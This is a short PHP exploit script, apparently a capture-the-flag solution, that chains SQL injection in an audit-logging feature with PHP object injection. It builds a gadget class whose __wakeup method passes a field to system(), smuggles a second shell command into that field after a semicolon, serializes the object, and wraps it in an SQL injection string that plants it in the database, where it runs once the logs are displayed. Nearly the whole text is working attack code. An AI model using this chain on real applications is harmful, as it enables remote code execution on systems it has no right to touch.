<?php
    namespace App\Traits;

    class IpCheck
    {
        public $ip;

        public function __construct($ip)
        {
            $this->ip = $ip;
        }

        public function __wakeup()
        {
            $safe_ip = system("curl $this->ip");
            var_dump($safe_ip);
        }
    }

    $command = "touch gomba.txt";
    $gadget = new IpCheck("127.0.0.1; $command");

    $wrapper = [
        'action' => 'PWN',
        'data' => $gadget,
        'message' => ''
    ];
    $serialized = serialize($wrapper);
    $new_serialized = str_replace('\\', '\\\\', $serialized);
    var_dump($new_serialized);

    $payload = "USER_AGENT_HERE', '$new_serialized', 'CONTEXT_HERE')-- -";
    echo($payload);

    /*
    TLDR;
    1. SQL Injection in custom audit logging
    2. Object Injection in displaying the audit logs
    3. Use SQLi to insert malicious serialized payload into the database
    */
